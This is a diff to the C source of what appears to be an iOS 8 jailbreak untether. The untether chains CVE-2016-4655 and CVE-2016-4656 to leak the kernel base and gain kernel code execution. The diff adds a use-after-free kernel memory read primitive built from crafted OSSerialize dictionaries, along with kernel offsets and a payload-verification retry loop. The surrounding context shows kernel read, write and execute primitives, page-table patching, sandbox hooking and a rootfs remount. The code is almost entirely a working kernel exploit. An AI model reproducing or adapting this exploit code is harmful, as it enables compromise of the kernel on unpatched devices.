@@ -21,6 +21,7 @@
 #define ERROR(x, ...)       do { printf("[%s] ERROR:"x"\n", __FUNCTION__, ##__VA_ARGS__); } while(0)
 #define LOG(x, ...)         do { printf("[%s] "x"\n", __FUNCTION__, ##__VA_ARGS__); } while(0)
 
+#define MIG_MSG_SIZE 0x1000
 
 #define NEWFILE  (O_WRONLY|O_SYNC)
 #define CONSOLE "/dev/console"
@@ -47,6 +48,8 @@
 #define CHUNK_SIZE 0x800
 
 #define KERNEL_BASE_ADDRESS (0x80001000)
+
+static uint32_t base = 0;
 
 static char *lockfile;
 static int fd;
@@ -80,8 +83,26 @@ kern_return_t clock_get_attributes(clock_serv_t clock_serv, clock_flavor_t flavo
 kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
 kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
 
+typedef const uint32_t * vtab_t;
+typedef struct
+{
+    vtab_t       vtab;
+    int          retainCount;
+    unsigned int flags;
+    unsigned int length;
+    const char * string;
+} OSString;
+
 static mach_port_t tfp0 = 0;
 static int isA6 = 0;
+
+static void dumpData(void *buf, size_t size)
+{
+    for(int i = 0; i < size; i += 4)
+    {
+        LOG("%08x: %08x", i, *(uint32_t*)(buf+i));
+    }
+}
 
 static void copyin(void* to, uint32_t from, size_t size)
 {
@@ -156,18 +177,25 @@ static uint32_t write_primitive_dword_tfp0(uint32_t addr, uint32_t val)
 
 enum
 {
-    kOSSerializeDictionary   = 0x01000000U,
-    kOSSerializeArray        = 0x02000000U,
-    kOSSerializeSet          = 0x03000000U,
-    kOSSerializeNumber       = 0x04000000U,
-    kOSSerializeSymbol       = 0x08000000U,
-    kOSSerializeString       = 0x09000000U,
-    kOSSerializeData         = 0x0a000000U,
-    kOSSerializeBoolean      = 0x0b000000U,
-    kOSSerializeObject       = 0x0c000000U,
-    kOSSerializeTypeMask     = 0x7F000000U,
-    kOSSerializeDataMask     = 0x00FFFFFFU,
-    kOSSerializeEndCollecton = 0x80000000U,
+    kOSSerializeDictionary    = 0x01000000U,
+    kOSSerializeArray         = 0x02000000U,
+    kOSSerializeSet           = 0x03000000U,
+    kOSSerializeNumber        = 0x04000000U,
+    kOSSerializeSymbol        = 0x08000000U,
+    kOSSerializeString        = 0x09000000U,
+    kOSSerializeData          = 0x0a000000U,
+    kOSSerializeBoolean       = 0x0b000000U,
+    kOSSerializeObject        = 0x0c000000U,
+    kOSSerializeTypeMask      = 0x7F000000U,
+    kOSSerializeDataMask      = 0x00FFFFFFU,
+    kOSSerializeEndCollection = 0x80000000U,
+    
+    kOSSerializeMagic         = 0x000000d3U,
+};
+
+enum
+{
+    kOSStringNoCopy = 0x00000001,
 };
 
 static unsigned char clock_ops_overwrite[] = {
@@ -211,8 +239,9 @@ enum koffsets {
     offsetof_posix_check,              // posix_check_ret_addr offset
     offsetof_mac_proc_check,           // mac_proc_check_ret_addr offset
     offsetof_allproc,                  // allproc
-    offsetof_p_pid,                  // proc_t::p_pid
-    offsetof_p_ucred,                // proc_t::p_ucred
+    offsetof_p_pid,                    // proc_t::p_pid
+    offsetof_p_ucred,                  // proc_t::p_ucred
+    offsetof_vtab,                     // vtab
 };
 
 static uint32_t koffsets_S5L895xX_12H321[] = {
@@ -235,6 +264,7 @@ static uint32_t koffsets_S5L895xX_12H321[] = {
     0x3f9970,   // allproc
     0x8,        // proc_t::p_pid
     0x8c,       // proc_t::p_ucred
+    0x39cd08,   // vtab
 };
 
 static uint32_t koffsets_S5L894xX_12H321[] = {
@@ -257,6 +287,7 @@ static uint32_t koffsets_S5L894xX_12H321[] = {
     0x3F4810,   // allproc
     0x8,        // proc_t::p_pid
     0x8c,       // proc_t::p_ucred
+    0x397d08,   // vtab
 };
 
 static uint32_t koffset(enum koffsets offset)
@@ -308,6 +339,220 @@ static void offsets_init(void)
     }
 }
 
+/* --- cl0ver --- */
+#include <mach/mach_time.h>     // mach_absolute_time
+
+static uint64_t nanoseconds_to_mach_time(uint64_t ns)
+{
+    static struct mach_timebase_info timebase = { .numer = 0, .denom = 0 };
+    if(timebase.denom == 0)
+    {
+        mach_timebase_info(&timebase);
+    }
+    return ns * timebase.denom / timebase.numer;
+}
+
+#define TIMER_START(timer) \
+uint64_t timer = mach_absolute_time();
+
+#define TIMER_SLEEP_UNTIL(timer, ns) \
+do \
+{ \
+mach_wait_until(timer + nanoseconds_to_mach_time(ns)); \
+} while(0)
+
+// io
+static mach_port_t get_io_master_port(void)
+{
+    static mach_port_t master = MACH_PORT_NULL;
+    if(master == MACH_PORT_NULL)
+    {
+        LOG("Getting IO master port...");
+        kern_return_t ret = host_get_io_master(mach_host_self(), &master);
+        if(ret != KERN_SUCCESS || !MACH_PORT_VALID(master))
+        {
+            ERROR("Failed to get IO master port (port = 0x%08x, ret = %u: %s)", master, ret, mach_error_string(ret));
+            return MACH_PORT_NULL;
+        }
+    }
+    return master;
+}
+
+static io_service_t _io_get_service(void)
+{
+    static io_service_t service = MACH_PORT_NULL;
+    if(service == MACH_PORT_NULL)
+    {
+        LOG("Getting IO service handle...");
+        service = IOServiceGetMatchingService(get_io_master_port(), IOServiceMatching("AppleMobileFileIntegrity"));
+        if(!MACH_PORT_VALID(service))
+        {
+            ERROR("Failed to get IO service handle (port = 0x%08x)", service);
+            return MACH_PORT_NULL;
+        }
+    }
+    return service;
+}
+
+static io_iterator_t _io_iterator(void)
+{
+    LOG("Creating dict iterator...");
+    io_iterator_t it = 0;
+    kern_return_t ret = IORegistryEntryCreateIterator(_io_get_service(), "IOService", kIORegistryIterateRecursively, &it);
+    if(ret != KERN_SUCCESS)
+    {
+        //ERROR("Failed to create iterator (ret = %u: %s)", ret, mach_error_string(ret));
+    }
+    return it;
+}
+
+static io_object_t _io_next(io_iterator_t it)
+{
+    LOG("Getting next element from iterator...");
+    io_object_t o = IOIteratorNext(it);
+    if(o == 0)
+    {
+        ERROR("Failed to get next iterator element");
+        return -1;
+    }
+    return o;
+}
+
+static io_connect_t _io_spawn_client(void *dict, size_t dictlen)
+{
+    LOG("Spawning user client / Parsing dictionary...");
+    io_connect_t client = MACH_PORT_NULL;
+    kern_return_t err;
+    kern_return_t ret = io_service_open_extended(_io_get_service(), mach_task_self(), 0, NDR_record, dict, dictlen, &err, &client);
+    if(ret != KERN_SUCCESS || err != KERN_SUCCESS || !MACH_PORT_VALID(client))
+    {
+        //ERROR("Failed to parse dictionary (client = 0x%08x, ret = %u: %s, err = %u: %s)", client, ret, mach_error_string(ret), err, mach_error_string(err));
+    }
+    return client;
+}
+
+static void _io_find(const char *key, void *buf, uint32_t *buflen)
+{
+    io_iterator_t it = _io_iterator();
+    {
+        io_object_t o;
+        bool found = false;
+        while(!found && (o = _io_next(it)) != 0)
+        {
+            if(IORegistryEntryGetProperty(o, key, buf, buflen) == KERN_SUCCESS)
+            {
+                found = true;
+            }
+            IOObjectRelease(o);
+        }
+        if(!found)
+        {
+            ERROR("Failed to find property: %s", key);
+            return;
+        }
+    }
+    
+    {
+        IOObjectRelease(it);
+    }
+}
+
+static void _io_release_client(io_connect_t client)
+{
+    LOG("Releasing user client...");
+    kern_return_t ret = IOServiceClose(client);
+    if(ret != KERN_SUCCESS)
+    {
+        //ERROR("Failed to release user client (ret = %u: %s)", ret, mach_error_string(ret));
+    }
+}
+
+static void dict_get_bytes(void *dict, size_t dictlen, const char *key, void *buf, uint32_t *buflen)
+{
+    TIMER_START(timer);
+    io_connect_t client = _io_spawn_client(dict, dictlen);
+    {
+        _io_find(key, buf, buflen);
+    }
+    
+    {
+        _io_release_client(client);
+    }
+    // Async cleanup
+    TIMER_SLEEP_UNTIL(timer, 50e6); // 50ms
+}
+
+static void uaf_get_bytes(const OSString *fake, char *buf, size_t len)
+{
+    LOG("Using UAF to read kernel bytes...");
+    const uint32_t *data = (const uint32_t*)fake;
+    
+    uint32_t buflen = (uint32_t)len;
+    const char str[] = "str";
+    const char ref[] = "ref";
+    const char sav[] = "sav";
+    
+    {
+        uint32_t dict_90[] =
+        {
+            kOSSerializeMagic,                                              // Magic
+            kOSSerializeEndCollection | kOSSerializeDictionary | 6,         // Dictionary with 6 entries
+            
+            kOSSerializeSymbol | 4,                                         // Whatever name
+            *((uint32_t*)str),
+            kOSSerializeString | 4,                                         // String that will get freed
+            *((uint32_t*)str),
+            
+            kOSSerializeObject | 1,                                         // Same name
+            kOSSerializeBoolean | 1,                                        // Lightweight value
+            
+            kOSSerializeObject | 1,                                         // Same name again
+            kOSSerializeData | sizeof(OSString),                            // OSData with same size as OSString
+
+            data[0],                                                        // vtable pointer
+            data[1],                                                        // retainCount
+            data[2],                                                        // flags
+            data[3],                                                        // length
+            data[4],                                                        // string pointer
+            
+            kOSSerializeSymbol | 4,                                         // Name that we're gonna use to retrieve bytes
+            *((uint32_t*)ref),
+            kOSSerializeObject | 2,                                         // Reference to the overwritten OSString
+            
+            kOSSerializeSymbol | 4,                                         // Create a reference to the OSData to prevent it
+            *((uint32_t*)sav),                                              // from being freed before the OSString, which
+            kOSSerializeEndCollection | kOSSerializeObject | 4,             // would cause a panic (because heap poisoning).
+        };
+        //PRINT_BUF("dict_90", dict_90, sizeof(dict_90));
+        
+        usleep(10000);
+        
+        dict_get_bytes(dict_90, sizeof(dict_90), ref, buf, &buflen);
+    }
+}
+
+static void uaf_read_naive(const char *addr, char *buf, size_t len)
+{
+    LOG("Dumping kernel bytes %08x - %08x ...", (uint32_t)addr, (uint32_t)(addr + len));
+    
+    OSString osstr =
+    {
+        .vtab = (vtab_t)(base + koffset(offsetof_vtab)),    // actual OSString vtable
+        .retainCount = 100,                                 // don't try to free this
+        .flags = kOSStringNoCopy,                           // and neither the "string" it points to
+    };
+    
+    for(size_t off = 0; off < len; off += osstr.length)
+    {
+        osstr.length = len - off;
+        osstr.length = osstr.length > MIG_MSG_SIZE ? MIG_MSG_SIZE : osstr.length;
+        osstr.string = &addr[off];
+        uaf_get_bytes(&osstr, &buf[off], osstr.length);
+    }
+    
+}
+/* --- cl0ver --- */
+
 static void init(void)
 {
 #ifdef UNTETHER
@@ -333,7 +578,7 @@ static void init(void)
 #endif
 }
 
-void initialize(void)
+static void initialize(void)
 {
     kern_return_t kr;
     
@@ -364,7 +609,7 @@ void initialize(void)
 
 
 // CVE-2016-4655
-uint32_t leak_kernel_base(void)
+static uint32_t leak_kernel_base(void)
 {
     
     LOG("running CVE-2016-4655");
@@ -375,7 +620,7 @@ uint32_t leak_kernel_base(void)
     memcpy(data, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
     bufpos += sizeof(kOSSerializeBinarySignature);
     
-    WRITE_IN(data, kOSSerializeDictionary | kOSSerializeEndCollecton | 2);
+    WRITE_IN(data, kOSSerializeDictionary | kOSSerializeEndCollection | 2);
     
     WRITE_IN(data, kOSSerializeSymbol | 30);
     WRITE_IN(data, 0x4b444948); // "HIDKeyboardModifierMappingSrc"
@@ -399,7 +644,7 @@ uint32_t leak_kernel_base(void)
     WRITE_IN(data, 0x69707061);
     WRITE_IN(data, 0x7344676e);
     WRITE_IN(data, 0x00000074);
-    WRITE_IN(data, kOSSerializeNumber | kOSSerializeEndCollecton | 32);
+    WRITE_IN(data, kOSSerializeNumber | kOSSerializeEndCollection | 32);
     WRITE_IN(data, 0x00000193);
     WRITE_IN(data, 0X00000000);
     
@@ -433,7 +678,7 @@ uint32_t leak_kernel_base(void)
     return 0;
 }
 
-void *insert_payload(void *ptr)
+static void *insert_payload(void *ptr)
 {
     char stackAnchor;
     uint32_t bufpos; // unsigned int size;
@@ -455,7 +700,7 @@ void *insert_payload(void *ptr)
     memcpy(buffer, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
     bufpos = sizeof(kOSSerializeBinarySignature);
     
-    WRITE_IN(buffer, kOSSerializeDictionary | kOSSerializeEndCollecton | 2);
+    WRITE_IN(buffer, kOSSerializeDictionary | kOSSerializeEndCollection | 2);
     
     WRITE_IN(buffer, kOSSerializeSymbol | 128);
     // "ararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararara"
@@ -477,7 +722,7 @@ void *insert_payload(void *ptr)
     WRITE_IN(buffer, 0x69707061);
     WRITE_IN(buffer, 0x7344676e);
     WRITE_IN(buffer, 0x00000074);
-    WRITE_IN(buffer, kOSSerializeNumber | kOSSerializeEndCollecton | 32);
+    WRITE_IN(buffer, kOSSerializeNumber | kOSSerializeEndCollection | 32);
     WRITE_IN(buffer, 0x00000193);
     WRITE_IN(buffer, 0x00000000);
     
@@ -534,6 +779,7 @@ void *insert_payload(void *ptr)
     
     memcpy(pExploit+PEXPLOIT_TO_UAF_PAYLOAD, uaf_payload_buffer, sizeof(uaf_payload_buffer));
     memcpy(pExploit+PEXPLOIT_TO_UAF_PAYLOAD+sizeof(uaf_payload_buffer), clock_ops_overwrite, sizeof(clock_ops_overwrite));
+    //dumpData(pExploit, 128);
     
     // kauth_filesec.fsec_acl.acl_ace[...]
     memcpy((void *)(((unsigned int)&stackAnchor & 0xFFFFF000) | 0xEEC), pExploit, 128);
@@ -544,7 +790,7 @@ void *insert_payload(void *ptr)
     return NULL;
 }
 
-void exec_primitive(uint32_t fct, uint32_t arg1, uint32_t arg2)
+static void exec_primitive(uint32_t fct, uint32_t arg1, uint32_t arg2)
 {
     int attr;
     unsigned int attrCnt;
@@ -559,7 +805,7 @@ void exec_primitive(uint32_t fct, uint32_t arg1, uint32_t arg2)
     read(fildes[0], data, 64);
 }
 
-uint32_t read_primitive(uint32_t addr)
+static uint32_t read_primitive(uint32_t addr)
 {
     int attr;
     unsigned int attrCnt;
@@ -567,13 +813,13 @@ uint32_t read_primitive(uint32_t addr)
     return clock_get_attributes(clk_battery, addr, &attr, &attrCnt);
 }
 
-void write_primitive(uint32_t addr, uint32_t value)
+static void write_primitive(uint32_t addr, uint32_t value)
 {
     addr -= 0xc;
     exec_primitive(write_gadget, addr, value);
 }
 
-void patch_page_table(int hasTFP0, uint32_t tte_virt, uint32_t tte_phys, uint32_t flush_dcache, uint32_t invalidate_tlb, uint32_t page)
+static void patch_page_table(int hasTFP0, uint32_t tte_virt, uint32_t tte_phys, uint32_t flush_dcache, uint32_t invalidate_tlb, uint32_t page)
 {
     uint32_t i = page >> 20;
     uint32_t j = (page >> 12) & 0xFF;
@@ -602,8 +848,10 @@ void patch_page_table(int hasTFP0, uint32_t tte_virt, uint32_t tte_phys, uint32_
     
 }
 
-void do_exploit(uint32_t kernel_base)
+static void do_exploit(uint32_t kernel_base)
 {
+    
+retry:
     LOG("running CVE-2016-4656");
     
     pthread_t insert_payload_thread;
@@ -627,7 +875,7 @@ void do_exploit(uint32_t kernel_base)
     memcpy(data, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
     bufpos += sizeof(kOSSerializeBinarySignature);
     
-    WRITE_IN(data, kOSSerializeDictionary | kOSSerializeEndCollecton | 0x10);
+    WRITE_IN(data, kOSSerializeDictionary | kOSSerializeEndCollection | 0x10);
     
     {
         /* pre-9.1 doesn't accept strings as keys, but duplicate keys :D */
@@ -653,7 +901,28 @@ void do_exploit(uint32_t kernel_base)
     WRITE_IN(data, kernel_base + koffset(offsetof_OSSerializer_serialize) +1);  // [10] address of OSSerializer::serialize (+1)
     
     /* now create a reference to object 1 which is the OSString object that was just freed */
-    WRITE_IN(data, kOSSerializeObject | kOSSerializeEndCollecton | (1 ? 2 : 1));
+    WRITE_IN(data, kOSSerializeObject | kOSSerializeEndCollection | (1 ? 2 : 1));
+    
+    /* -- BETA: checking payload -- */
+    char *check = malloc(128);
+    char *base = (char*)(payload_ptr+PAYLOAD_TO_PEXPLOIT);
+    uaf_read_naive(base, check, 128);
+    //dumpData(check, 128);
+    
+    for(int i = 0x08; i<0x44; i+=4)
+    {
+        if(*(uint32_t*)(check + i) != *(uint32_t*)(pExploit + i))
+        {
+            ERROR("WTF?!");
+            LOG("retry...");
+            master = MACH_PORT_NULL;
+            memset(&pExploit, '\0', 128);
+            memset(&data, '\0', 4096);
+            bufpos = 0;
+            usleep(10000);
+            goto retry;
+        }
+    }
     
     /* get a master port for IOKit API */
     host_get_io_master(mach_host_self(), &master);
@@ -772,7 +1041,7 @@ void do_exploit(uint32_t kernel_base)
 #endif /* KPATCH */
 }
 
-void dump_kernel(vm_address_t kernel_base, uint8_t *dest, size_t ksize)
+static void dump_kernel(vm_address_t kernel_base, uint8_t *dest, size_t ksize)
 {
     for (vm_address_t addr = kernel_base, e = 0; addr < kernel_base + ksize; addr += CHUNK_SIZE, e += CHUNK_SIZE)
     {
@@ -785,7 +1054,7 @@ void dump_kernel(vm_address_t kernel_base, uint8_t *dest, size_t ksize)
     }
 }
 
-void patch_bootargs(uint32_t addr)
+static void patch_bootargs(uint32_t addr)
 {
     LOG("setting bootargs");
     uint32_t bootargs_addr = read_primitive_dword_tfp0(addr) + 0x38;
@@ -803,7 +1072,7 @@ void patch_bootargs(uint32_t addr)
 
 // sandbox stuff
 // by xerub's iloader
-unsigned int
+static unsigned int
 make_b_w(int pos, int tgt)
 {
     int delta;
@@ -866,7 +1135,7 @@ make_b_w(int pos, int tgt)
     return -1;
 }
 
-unsigned int
+static unsigned int
 make_bl(int pos, int tgt)
 {
     int delta;
@@ -883,7 +1152,7 @@ make_bl(int pos, int tgt)
     return (unsigned int)pfx | ((unsigned int)sfx << 16);
 }
 
-void unjail8(uint32_t kbase)
+static void unjail8(uint32_t kbase)
 {
     LOG("jailbreaking...");
     
@@ -1021,7 +1290,7 @@ void unjail8(uint32_t kbase)
     *(uint32_t*)(taig32_payload+0x88) = sb_evaluate_val;
     *(uint32_t*)(taig32_payload+0x8c) = back_sb_evaluate;
     
-    void* sandbox_payload = malloc(payload_len);
+    unsigned char* sandbox_payload = malloc(payload_len);
     memcpy(sandbox_payload, taig32_payload, payload_len);
     
     // hook sb_evaluate
@@ -1038,7 +1307,7 @@ void unjail8(uint32_t kbase)
     
 }
 
-void load_jb(void)
+static void load_jb(void)
 {
     // remount rootfs
     LOG("remounting rootfs");
@@ -1088,7 +1357,7 @@ void load_jb(void)
     
 }
 
-void failed(void)
+static void failed(void)
 {
     LOG("failed to execute untether. rebooting.");
     reboot(0);
@@ -1103,6 +1372,7 @@ int main(void)
     initialize();
     
     uint32_t kernel_base = leak_kernel_base();
+    base = kernel_base;
     LOG("kernel_base: %x", kernel_base);
     
     do_exploit(kernel_base);
